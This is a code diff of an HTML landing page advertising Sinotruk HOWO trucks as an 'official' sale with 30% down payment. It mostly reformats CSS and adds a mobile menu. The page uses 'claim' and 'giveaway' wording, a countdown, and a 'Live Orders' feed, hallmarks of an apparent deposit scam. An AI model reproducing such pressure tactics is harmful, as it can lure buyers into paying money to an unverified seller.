@@ -4,547 +4,139 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Sinotruk HOWO | Official Truck Sale – 30% Down Payment</title>
-    <!-- FontAwesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <!-- EmailJS -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <!-- Crisp Chat Widget -->
     <script type="text/javascript">
         window.$crisp=[];
         window.CRISP_WEBSITE_ID="376d5206-b602-47e1-8e94-e8791be20f4f";
-        (function(){
-            d=document;
-            s=d.createElement("script");
-            s.src="https://client.crisp.chat/l.js";
-            s.async=1;
-            d.getElementsByTagName("head")[0].appendChild(s);
-        })();
+        (function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();
     </script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #FFFFFF;
-            color: #1A1A1A;
-            line-height: 1.5;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #FFFFFF; color: #1A1A1A; line-height: 1.5; }
         @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap');
-
-        .container {
-            max-width: 1280px;
-            margin: 0 auto;
-            padding: 0 1.5rem;
-        }
-
-        /* Trust Bar */
-        .trust-bar {
-            background: #1A1A1A;
-            border-bottom: 1px solid #333;
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            padding: 0.75rem 1rem;
-            font-size: 0.8rem;
-            flex-wrap: wrap;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
+        .container { max-width: 1280px; margin: 0 auto; padding: 0 1.5rem; }
+        .trust-bar { background: #1A1A1A; display: flex; justify-content: center; gap: 2rem; padding: 0.75rem 1rem; font-size: 0.8rem; flex-wrap: wrap; position: sticky; top: 0; z-index: 100; }
         .trust-item { display: flex; align-items: center; gap: 0.5rem; color: #FFFFFF; }
         .trust-item i { color: #D4AF37; width: 16px; }
-
-        /* Header / Nav */
-        .main-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem 1.5rem;
-            flex-wrap: wrap;
-            border-bottom: 1px solid #E5E5E5;
-            max-width: 1280px;
-            margin: 0 auto;
-            position: relative;
-        }
-        .logo-area { display: flex; align-items: center; gap: 0.5rem; }
+        .main-header { display: flex; justify-content: space-between; align-items: center; padding: 1rem 1.5rem; flex-wrap: wrap; max-width: 1280px; margin: 0 auto; position: relative; }
+        .logo-area { display: flex; align-items: center; gap: 0.8rem; }
         .logo-area img { height: 45px; width: auto; }
         .logo-area h2 { font-weight: 700; color: #C41E3A; }
-        .nav-links { display: flex; gap: 1.5rem; flex-wrap: wrap; align-items: center; }
+        .nav-links { display: flex; gap: 1.5rem; align-items: center; }
         .nav-links a { text-decoration: none; color: #1A1A1A; font-weight: 500; transition: color 0.2s; cursor: pointer; }
         .nav-links a:hover { color: #C41E3A; }
-        .claim-nav { background: #C41E3A; color: white !important; padding: 0.3rem 0.8rem; border-radius: 2rem; }
+        .claim-nav { background: #C41E3A; color: white !important; padding: 0.4rem 1rem; border-radius: 2rem; }
         .claim-nav:hover { background: #8B0000; }
+        .mobile-menu-btn { display: none; background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #1A1A1A; }
         .bell-container { position: relative; cursor: pointer; }
         .bell-container i { font-size: 1.3rem; color: #1A1A1A; transition: color 0.2s; }
         .bell-container i:hover { color: #C41E3A; }
         .bell-badge { position: absolute; top: -8px; right: -10px; background: #C41E3A; color: white; font-size: 0.65rem; font-weight: bold; padding: 0.15rem 0.4rem; border-radius: 50%; }
-        .notification-dropdown { position: absolute; top: 45px; right: 0; width: 320px; background: white; border: 1px solid #E5E5E5; border-radius: 0.8rem; box-shadow: 0 10px 25px rgba(0,0,0,0.1); z-index: 200; display: none; max-height: 400px; overflow-y: auto; }
+        .notification-dropdown { position: absolute; top: 45px; right: 0; width: 340px; background: white; border: 1px solid #E5E5E5; border-radius: 0.8rem; box-shadow: 0 10px 25px rgba(0,0,0,0.1); z-index: 200; display: none; max-height: 400px; overflow-y: auto; }
         .notification-dropdown.show { display: block; }
         .notification-header { padding: 12px 15px; border-bottom: 1px solid #E5E5E5; font-weight: 700; background: #F8F8F8; border-radius: 0.8rem 0.8rem 0 0; }
         .notification-item { padding: 12px 15px; border-bottom: 1px solid #F5F5F5; }
-        .notification-item:last-child { border-bottom: none; }
         .notification-time { font-size: 0.7rem; color: #888; margin-bottom: 4px; }
         .notification-title { font-weight: 600; font-size: 0.85rem; margin-bottom: 4px; }
         .notification-detail { font-size: 0.75rem; color: #666; }
         .cancel-btn { background: none; border: none; color: #C41E3A; cursor: pointer; font-size: 0.8rem; margin-top: 8px; padding: 4px 0; width: 100%; text-align: left; }
         .cancel-btn:hover { text-decoration: underline; }
-
-        /* Hero */
-        .hero { text-align: center; padding: 2rem 1rem; max-width: 800px; margin: 0 auto; }
-        .live-badge { display: inline-flex; align-items: center; gap: 0.4rem; background: #FFF5F5; padding: 0.3rem 1rem; border-radius: 2rem; font-size: 0.8rem; margin-bottom: 1rem; }
+        .hero { text-align: center; padding: 2.5rem 1rem; max-width: 800px; margin: 0 auto; }
+        .live-badge { display: inline-flex; align-items: center; gap: 0.4rem; background: #FFF5F5; padding: 0.4rem 1rem; border-radius: 2rem; font-size: 0.8rem; margin-bottom: 1rem; }
         .live-dot { width: 8px; height: 8px; background: #22C55E; border-radius: 50%; display: inline-block; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { opacity: 0.3; transform: scale(0.8); } 50% { opacity: 1; transform: scale(1.2); } 100% { opacity: 0.3; transform: scale(0.8); } }
-        .hero h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 0.8rem; color: #1A1A1A; }
+        .hero h1 { font-size: 2.8rem; font-weight: 800; margin-bottom: 0.8rem; color: #1A1A1A; }
         .hero p { font-size: 1rem; color: #4B4B4B; max-width: 600px; margin: 0 auto; }
-        .offer-badge { background: #D4AF37; color: #1A1A1A; display: inline-block; padding: 0.3rem 1rem; border-radius: 2rem; font-weight: 600; margin-top: 1rem; }
-        .hero-buttons { display: flex; gap: 1rem; justify-content: center; margin-top: 1.5rem; flex-wrap: wrap; }
-        .btn-red { background: #C41E3A; color: white; padding: 0.7rem 1.5rem; border-radius: 2rem; border: none; cursor: pointer; font-size: 0.9rem; transition: all 0.2s; font-weight: 600; }
+        .offer-badge { background: #D4AF37; color: #1A1A1A; display: inline-block; padding: 0.4rem 1rem; border-radius: 2rem; font-weight: 700; margin-top: 1rem; }
+        .hero-buttons { display: flex; gap: 1rem; justify-content: center; margin-top: 1.8rem; flex-wrap: wrap; }
+        .btn-red { background: #C41E3A; color: white; padding: 0.8rem 1.8rem; border-radius: 2.5rem; border: none; cursor: pointer; font-size: 0.9rem; transition: all 0.2s; font-weight: 600; }
         .btn-red:hover { background: #8B0000; transform: scale(1.02); }
-        .btn-red:active { transform: scale(0.97); }
-        .btn-outline { border: 1px solid #C41E3A; color: #C41E3A; padding: 0.7rem 1.5rem; border-radius: 2rem; background: white; cursor: pointer; font-size: 0.9rem; transition: all 0.2s; font-weight: 600; }
+        .btn-outline { border: 1px solid #C41E3A; color: #C41E3A; padding: 0.8rem 1.8rem; border-radius: 2.5rem; background: white; cursor: pointer; font-size: 0.9rem; transition: all 0.2s; font-weight: 600; }
         .btn-outline:hover { background: #FFF5F5; transform: scale(1.02); }
-        .btn-outline:active { transform: scale(0.97); }
-
-        /* Trust Badges Row */
-        .trust-badges-row {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            padding: 1rem;
-            border-top: 1px solid #E5E5E5;
-            border-bottom: 1px solid #E5E5E5;
-            margin: 1rem 0;
-        }
+        .trust-badges-row { display: flex; justify-content: center; gap: 2rem; padding: 1rem; border-top: 1px solid #E5E5E5; border-bottom: 1px solid #E5E5E5; margin: 1rem 0; flex-wrap: wrap; }
         .trust-badges-row span i { color: #D4AF37; margin-right: 0.3rem; }
-
-        /* Double Truck Image */
-        .double-truck {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            margin: 2rem 0;
-            flex-wrap: wrap;
-        }
-        .truck-image-box {
-            text-align: center;
-            flex: 1;
-            min-width: 200px;
-        }
-        .truck-image-box img {
-            width: 100%;
-            max-width: 300px;
-            border-radius: 1rem;
-        }
-
-        /* Truck Grid */
-        .trucks-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-            gap: 1.8rem;
-            margin: 1.5rem 0;
-        }
-        .truck-card {
-            background: white;
-            border-radius: 1rem;
-            overflow: hidden;
-            border: 1px solid #E5E5E5;
-            transition: all 0.2s;
-            position: relative;
-        }
-        .truck-card:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);
-            border-color: #C41E3A;
-        }
-        .card-badge {
-            position: absolute;
-            top: 12px;
-            left: 12px;
-            padding: 0.2rem 0.7rem;
-            border-radius: 2rem;
-            font-size: 0.7rem;
-            font-weight: 700;
-            z-index: 2;
-        }
-        .card-image {
-            width: 100%;
-            height: 180px;
-            object-fit: cover;
-            background: #F0F0F0;
-        }
-        .truck-info {
-            padding: 1rem;
-        }
-        .truck-category {
-            font-size: 0.7rem;
-            letter-spacing: 1px;
-            color: #6B7280;
-            margin-bottom: 0.3rem;
-        }
-        .truck-title {
-            font-size: 1.3rem;
-            font-weight: 700;
-        }
-        .spec-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 0.5rem;
-            margin: 0.8rem 0;
-            font-size: 0.8rem;
-        }
-        .spec-item i {
-            width: 18px;
-            color: #D4AF37;
-            margin-right: 0.3rem;
-        }
-        .price {
-            font-size: 1.2rem;
-            font-weight: 600;
-            margin: 0.5rem 0;
-            color: #1A1A1A;
-        }
-        .upfront {
-            font-size: 1.5rem;
-            font-weight: 800;
-            margin: 0.3rem 0;
-            color: #C41E3A;
-        }
-        .upfront small {
-            font-size: 0.7rem;
-            font-weight: normal;
-            color: #6B7280;
-        }
-        .terms {
-            font-size: 0.7rem;
-            color: #6B7280;
-            margin-bottom: 0.5rem;
-        }
-        .claim-btn-card {
-            background: #C41E3A;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 0.7rem;
-            border-radius: 2rem;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 0.5rem;
-            transition: all 0.2s;
-        }
+        .double-truck { display: flex; justify-content: center; gap: 2rem; margin: 2rem 0; flex-wrap: wrap; }
+        .truck-image-box { text-align: center; flex: 1; min-width: 200px; }
+        .truck-image-box img { width: 100%; max-width: 300px; border-radius: 1rem; }
+        .trucks-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 1.8rem; margin: 1.5rem 0; }
+        .truck-card { background: white; border-radius: 1rem; overflow: hidden; border: 1px solid #E5E5E5; transition: all 0.2s; position: relative; }
+        .truck-card:hover { transform: translateY(-4px); box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); border-color: #C41E3A; }
+        .card-badge { position: absolute; top: 12px; left: 12px; padding: 0.2rem 0.7rem; border-radius: 2rem; font-size: 0.7rem; font-weight: 700; z-index: 2; }
+        .card-image { width: 100%; height: 180px; object-fit: cover; background: #F0F0F0; }
+        .truck-info { padding: 1rem; }
+        .truck-category { font-size: 0.7rem; letter-spacing: 1px; color: #6B7280; margin-bottom: 0.3rem; }
+        .truck-title { font-size: 1.3rem; font-weight: 700; }
+        .spec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.5rem; margin: 0.8rem 0; font-size: 0.8rem; }
+        .spec-item i { width: 18px; color: #D4AF37; margin-right: 0.3rem; }
+        .price { font-size: 1.2rem; font-weight: 600; margin: 0.5rem 0; color: #1A1A1A; }
+        .upfront { font-size: 1.5rem; font-weight: 800; margin: 0.3rem 0; color: #C41E3A; }
+        .upfront small { font-size: 0.7rem; font-weight: normal; color: #6B7280; }
+        .terms { font-size: 0.7rem; color: #6B7280; margin-bottom: 0.5rem; }
+        .claim-btn-card { background: #C41E3A; color: white; border: none; width: 100%; padding: 0.8rem; border-radius: 2.5rem; font-weight: 600; cursor: pointer; margin-top: 0.5rem; transition: all 0.2s; }
         .claim-btn-card:hover { background: #8B0000; }
-        .claim-btn-card:active { transform: scale(0.97); }
-
-        /* Swipeable Testimonials Carousel */
-        .testimonials-carousel {
-            position: relative;
-            background: #F8F8F8;
-            border-radius: 1rem;
-            padding: 1rem;
-            margin: 1.5rem 0;
-        }
-        .carousel-container {
-            display: flex;
-            gap: 1rem;
-            overflow-x: auto;
-            scroll-behavior: smooth;
-            padding: 0.5rem;
-            scrollbar-width: thin;
-        }
-        .testimonial-slide {
-            min-width: 280px;
-            background: white;
-            border-radius: 0.8rem;
-            padding: 1rem;
-            border-left: 3px solid #C41E3A;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-        .carousel-btn {
-            position: absolute;
-            top: 50%;
-            transform: translateY(-50%);
-            background: white;
-            border: 1px solid #E5E5E5;
-            border-radius: 50%;
-            width: 32px;
-            height: 32px;
-            cursor: pointer;
-            z-index: 2;
-            font-size: 1rem;
-        }
+        .testimonials-carousel { position: relative; background: #F8F8F8; border-radius: 1rem; padding: 1rem; margin: 1.5rem 0; }
+        .carousel-container { display: flex; gap: 1rem; overflow-x: auto; scroll-behavior: smooth; padding: 0.5rem; scrollbar-width: thin; }
+        .testimonial-slide { min-width: 280px; background: white; border-radius: 0.8rem; padding: 1rem; border-left: 3px solid #C41E3A; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .carousel-btn { position: absolute; top: 50%; transform: translateY(-50%); background: white; border: 1px solid #E5E5E5; border-radius: 50%; width: 32px; height: 32px; cursor: pointer; z-index: 2; font-size: 1rem; }
         .carousel-btn.prev { left: -12px; }
         .carousel-btn.next { right: -12px; }
-
-        /* Steps */
-        .steps-container {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1rem;
-            margin: 2rem 0;
-        }
-        .step {
-            flex: 1;
-            background: #F8F8F8;
-            padding: 1rem;
-            border-radius: 0.8rem;
-            text-align: center;
-        }
-        .step-number {
-            width: 36px;
-            height: 36px;
-            background: #C41E3A;
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 0.5rem;
-            font-weight: 700;
-        }
-
-        /* Countdown Box */
-        .countdown-box {
-            background: linear-gradient(135deg, #1A1A1A, #2A2A2A);
-            border-radius: 1.5rem;
-            padding: 1.5rem;
-            text-align: center;
-            color: white;
-            margin: 2rem 0;
-        }
-        .timer {
-            display: flex;
-            justify-content: center;
-            gap: 1rem;
-            margin: 1rem 0;
-        }
-        .time-unit {
-            background: rgba(255,255,255,0.1);
-            padding: 0.5rem 1rem;
-            border-radius: 0.5rem;
-            font-size: 1.5rem;
-            font-weight: 700;
-            min-width: 60px;
-        }
-
-        /* Live Feed */
-        .live-feed {
-            background: #F8F8F8;
-            border-radius: 1rem;
-            padding: 1rem;
-            max-height: 350px;
-            overflow-y: auto;
-            margin: 1rem 0;
-        }
-        .feed-item {
-            padding: 0.6rem;
-            border-bottom: 1px solid #E5E5E5;
-            font-size: 0.85rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            animation: fadeIn 0.3s;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        .steps-container { display: flex; flex-wrap: wrap; gap: 1rem; margin: 2rem 0; }
+        .step { flex: 1; background: #F8F8F8; padding: 1rem; border-radius: 0.8rem; text-align: center; }
+        .step-number { width: 36px; height: 36px; background: #C41E3A; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 0.5rem; font-weight: 700; }
+        .countdown-box { background: linear-gradient(135deg, #1A1A1A, #2A2A2A); border-radius: 1.5rem; padding: 1.8rem; text-align: center; color: white; margin: 2rem 0; }
+        .timer { display: flex; justify-content: center; gap: 1rem; margin: 1rem 0; }
+        .time-unit { background: rgba(255,255,255,0.1); padding: 0.5rem 1rem; border-radius: 0.5rem; font-size: 1.5rem; font-weight: 700; min-width: 60px; }
+        .live-feed { background: #F8F8F8; border-radius: 1rem; padding: 1rem; max-height: 350px; overflow-y: auto; margin: 1rem 0; }
+        .feed-item { padding: 0.6rem; border-bottom: 1px solid #E5E5E5; font-size: 0.85rem; display: flex; align-items: center; gap: 0.5rem; animation: fadeIn 0.3s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
         .feed-item i { color: #22C55E; }
-
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(4px);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        .modal-content {
-            background: white;
-            max-width: 550px;
-            width: 90%;
-            border-radius: 1.2rem;
-            padding: 1.5rem;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-        .form-group { margin-bottom: 1rem; }
-        .form-group label { font-weight: 500; display: block; margin-bottom: 0.3rem; }
-        input, select, textarea {
-            width: 100%;
-            padding: 0.7rem;
-            border: 1px solid #CCC;
-            border-radius: 0.5rem;
-            font-size: 0.9rem;
-            font-family: inherit;
-        }
-        .btn-submit {
-            background: #C41E3A;
-            color: white;
-            width: 100%;
-            padding: 0.8rem;
-            border: none;
-            border-radius: 2rem;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 1rem;
-            transition: all 0.2s;
-        }
-        .btn-submit:active { transform: scale(0.97); }
-        .btn-secondary {
-            background: #E5E5E5;
-            color: #1A1A1A;
-            width: 48%;
-            padding: 0.8rem;
-            border: none;
-            border-radius: 2rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .btn-secondary:active { transform: scale(0.97); }
-        .modal-buttons {
-            display: flex;
-            gap: 1rem;
-            justify-content: flex-end;
-            margin-top: 1rem;
-        }
-        .loading-spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid white;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.6s linear infinite;
-            margin-left: 8px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Success Page */
-        .success-card {
-            text-align: center;
-            padding: 1rem;
-        }
-        .success-icon {
-            font-size: 3.5rem;
-            color: #22C55E;
-            margin-bottom: 1rem;
-        }
-        .success-card h2 {
-            font-size: 1.8rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-            color: #1A1A1A;
-        }
-        .chat-btn {
-            display: inline-block;
-            background: #25D366;
-            color: white;
-            padding: 1rem 1.5rem;
-            border-radius: 2rem;
-            text-decoration: none;
-            font-weight: 600;
-            margin: 1rem 0;
-            transition: all 0.2s;
-            cursor: pointer;
-            border: none;
-            font-size: 1rem;
-        }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: white; max-width: 600px; width: 90%; border-radius: 1.2rem; padding: 1.8rem; max-height: 90vh; overflow-y: auto; }
+        .form-group { margin-bottom: 1.2rem; }
+        .form-group label { font-weight: 600; display: block; margin-bottom: 0.4rem; color: #1A1A1A; }
+        input, select, textarea { width: 100%; padding: 0.8rem; border: 1px solid #CCC; border-radius: 0.5rem; font-size: 0.9rem; font-family: inherit; transition: border 0.2s, box-shadow 0.2s; }
+        input:focus, select:focus, textarea:focus { outline: none; border-color: #C41E3A; box-shadow: 0 0 0 3px rgba(196,30,58,0.1); }
+        .radio-group { display: flex; gap: 1.5rem; margin-top: 0.5rem; flex-wrap: wrap; }
+        .radio-group label { display: flex; align-items: center; gap: 0.5rem; font-weight: normal; cursor: pointer; }
+        .radio-group input { width: auto; margin: 0; }
+        .btn-submit { background: #C41E3A; color: white; width: 100%; padding: 0.9rem; border: none; border-radius: 2.5rem; font-weight: 700; cursor: pointer; margin-top: 1rem; transition: all 0.2s; font-size: 1rem; }
+        .btn-submit:hover { background: #8B0000; }
+        .btn-secondary { background: #E5E5E5; color: #1A1A1A; padding: 0.8rem 1.5rem; border: none; border-radius: 2rem; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+        .btn-secondary:hover { background: #CCC; }
+        .modal-buttons { display: flex; gap: 1rem; justify-content: flex-end; margin-top: 1.5rem; }
+        .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid white; border-top-color: transparent; border-radius: 50%; animation: spin 0.6s linear infinite; margin-left: 8px; vertical-align: middle; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .error-message { background: #FEE2E2; color: #C41E3A; padding: 0.8rem; border-radius: 0.5rem; margin-bottom: 1rem; font-size: 0.85rem; text-align: center; }
+        .success-card { text-align: center; padding: 1rem; }
+        .success-icon { font-size: 3.5rem; color: #22C55E; margin-bottom: 1rem; }
+        .success-card h2 { font-size: 1.8rem; font-weight: 700; margin-bottom: 1rem; color: #1A1A1A; }
+        .chat-btn { background: #C41E3A; color: white; padding: 1rem 1.8rem; border-radius: 2.5rem; border: none; font-weight: 600; margin: 1rem 0; cursor: pointer; transition: all 0.2s; font-size: 1rem; }
+        .chat-btn:hover { background: #8B0000; transform: scale(1.02); }
         .chat-btn i { margin-right: 8px; }
-        .chat-btn:hover { transform: scale(1.02); background: #128C7E; }
-        .success-timer {
-            margin-top: 1rem;
-            font-size: 0.85rem;
-            color: #6B7280;
-        }
-
-        /* Toast Container */
-        .toast-container {
-            position: fixed;
-            top: 80px;
-            right: 20px;
-            z-index: 2000;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        .toast {
-            background: #1A1A1A;
-            color: white;
-            padding: 0.8rem 1.2rem;
-            border-radius: 0.8rem;
-            font-size: 0.85rem;
-            border-left: 3px solid #22C55E;
-            animation: slideIn 0.3s ease;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-        }
-        @keyframes slideIn {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-
-        /* Cancel Popup */
-        .cancel-popup-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            z-index: 3000;
-            justify-content: center;
-            align-items: center;
-        }
-        .cancel-popup {
-            background: white;
-            border-radius: 1rem;
-            padding: 1.5rem;
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-        }
+        .success-timer { margin-top: 1rem; font-size: 0.85rem; color: #6B7280; }
+        .toast-container { position: fixed; top: 80px; right: 20px; z-index: 2000; display: flex; flex-direction: column; gap: 10px; }
+        .toast { background: #1A1A1A; color: white; padding: 0.8rem 1.2rem; border-radius: 0.8rem; font-size: 0.85rem; border-left: 3px solid #22C55E; animation: slideIn 0.3s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
+        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        .cancel-popup-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 3000; justify-content: center; align-items: center; }
+        .cancel-popup { background: white; border-radius: 1rem; padding: 1.5rem; max-width: 400px; width: 90%; text-align: center; }
         .cancel-popup h3 { margin-bottom: 0.5rem; color: #1A1A1A; }
         .cancel-popup p { margin-bottom: 1.5rem; color: #4B4B4B; }
         .cancel-popup-buttons { display: flex; gap: 1rem; justify-content: center; }
         .cancel-popup-buttons button { padding: 0.5rem 1.5rem; border-radius: 2rem; border: none; cursor: pointer; font-weight: 600; }
         .cancel-confirm { background: #C41E3A; color: white; }
         .cancel-cancel { background: #E5E5E5; color: #1A1A1A; }
-
-        footer {
-            background: #1A1A1A;
-            padding: 2rem;
-            margin-top: 2rem;
-            text-align: center;
-            color: #FFFFFF;
-        }
-        .footer-badges {
-            display: flex;
-            justify-content: center;
-            gap: 1.5rem;
-            flex-wrap: wrap;
-            margin-bottom: 1rem;
-        }
+        footer { background: #1A1A1A; padding: 2rem; margin-top: 2rem; text-align: center; color: #FFFFFF; }
+        .footer-badges { display: flex; justify-content: center; gap: 1.5rem; flex-wrap: wrap; margin-bottom: 1rem; }
         .footer-badges span i { color: #D4AF37; margin-right: 0.3rem; }
-
         @media (max-width: 768px) {
             .hero h1 { font-size: 1.8rem; }
-            .nav-links { gap: 0.8rem; }
-            .timer { gap: 0.5rem; }
-            .time-unit { padding: 0.3rem 0.6rem; font-size: 1rem; }
+            .nav-links { display: none; flex-direction: column; position: absolute; top: 70px; right: 0; background: white; width: 100%; padding: 1rem; box-shadow: 0 10px 20px rgba(0,0,0,0.1); border-radius: 0 0 1rem 1rem; z-index: 99; }
+            .nav-links.show { display: flex; }
+            .mobile-menu-btn { display: block; }
+            .timer { gap: 0.3rem; }
+            .time-unit { padding: 0.3rem 0.6rem; font-size: 1rem; min-width: 50px; }
+            .notification-dropdown { position: fixed; top: auto; bottom: 20px; left: 50%; transform: translateX(-50%); right: auto; width: 90%; max-width: 340px; }
         }
     </style>
 </head>
@@ -559,10 +151,11 @@
 
 <div class="main-header">
     <div class="logo-area">
-        <img src="https://res.cloudinary.com/do9yjpizs/image/upload/v1780937264/qor3pst9rkks15rx9mcu.png" alt="Sinotruk HOWO Logo" style="height: 45px; width: auto;" onerror="this.src='https://placehold.co/200x60?text=SINOTRUK+HOWO'">
+        <img src="https://res.cloudinary.com/do9yjpizs/image/upload/v1780937264/qor3pst9rkks15rx9mcu.png" alt="Sinotruk HOWO Logo" onerror="this.src='https://placehold.co/200x60?text=SINOTRUK+HOWO'" style="height: 45px; width: auto;">
         <h2>SINOTRUK HOWO</h2>
     </div>
-    <div class="nav-links">
+    <button class="mobile-menu-btn" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <div class="nav-links" id="navLinks">
         <a class="footer-nav-link" data-target="giveaway">Trucks</a>
         <a class="footer-nav-link" data-target="info">Financing</a>
         <a class="footer-nav-link" data-target="instruction">How It Works</a>
@@ -571,7 +164,7 @@
             <i class="far fa-bell"></i>
             <span class="bell-badge" id="bellBadge" style="display: none;">0</span>
             <div class="notification-dropdown" id="notificationDropdown">
-                <div class="notification-header">🔔 Notifications</div>
+                <div class="notification-header">Notifications</div>
                 <div id="notificationList"></div>
             </div>
         </div>
@@ -585,7 +178,7 @@
     <p>High-quality Chinese trucks direct from manufacturer. For farmers, contractors, and logistics companies worldwide.</p>
     <div class="offer-badge"><i class="fas fa-percent"></i> 30% DOWN PAYMENT | 10 YEARS TO PAY THE REST</div>
     <div class="hero-buttons">
-        <button class="btn-red" id="heroClaimBtn"><i class="fas fa-truck"></i> Get Your Truck →</button>
+        <button class="btn-red" id="heroClaimBtn"><i class="fas fa-truck"></i> Get Your Truck</button>
         <button class="btn-outline" id="viewModelsBtn">View All Models</button>
     </div>
 </div>
@@ -630,7 +223,7 @@
         <div class="step"><div class="step-number">03</div><strong>Pay 30% Down</strong><br>Secure your truck</div>
         <div class="step"><div class="step-number">04</div><strong>Receive Truck</strong><br>Pay remaining in 10 years</div>
     </div>
-    <div style="text-align:center; margin:1rem 0;"><button class="btn-red" id="startClaimBtn"><i class="fas fa-truck"></i> Start Your Application →</button></div>
+    <div style="text-align:center; margin:1rem 0;"><button class="btn-red" id="startClaimBtn"><i class="fas fa-truck"></i> Start Your Application</button></div>
 
     <h3 id="transactions-section">Live Orders <span class="live-dot"></span></h3>
     <div class="live-feed" id="liveFeedList"></div>
@@ -649,23 +242,20 @@
 
 <div class="toast-container" id="toastContainer"></div>
 
-    <!-- Modals -->
 <div id="claimModal" class="modal"><div class="modal-content" id="claimModalContent"></div></div>
 <div id="businessModal" class="modal"><div class="modal-content" id="businessModalContent"></div></div>
 <div id="successModal" class="modal"><div class="modal-content" id="successModalContent"></div></div>
 <div id="cancelPopup" class="cancel-popup-overlay"><div class="cancel-popup"><h3>Cancel Application</h3><p>Are you sure you want to cancel your application? You can always reapply later.</p><div class="cancel-popup-buttons"><button class="cancel-confirm" id="confirmCancelBtn">Yes, Cancel</button><button class="cancel-cancel" id="dismissCancelBtn">No, Go Back</button></div></div></div>
 
 <script>
-    // Initialize EmailJS
     emailjs.init("oUr2KrIthXHDGSj1R");
 
-    // Truck Data (10 models)
     const trucks = [
         { id: 0, name: "HOWO Dump Truck", category: "Mining & Construction", badge: "Best Seller", badgeColor: "#D4AF37", capacity: "25-40 tons", engine: "WD615 336HP", fullPrice: 48000, price: "$48,000", upfront30: "$14,400", image: "https://placehold.co/600x400?text=HOWO+Dump+Truck" },
         { id: 1, name: "HOWO Heavy-Duty Cargo Truck", category: "Freight & Logistics", badge: "Most Popular", badgeColor: "#C41E3A", capacity: "20-30 tons", engine: "WD615 336HP", fullPrice: 45000, price: "$45,000", upfront30: "$13,500", image: "https://placehold.co/600x400?text=HOWO+Cargo+Truck" },
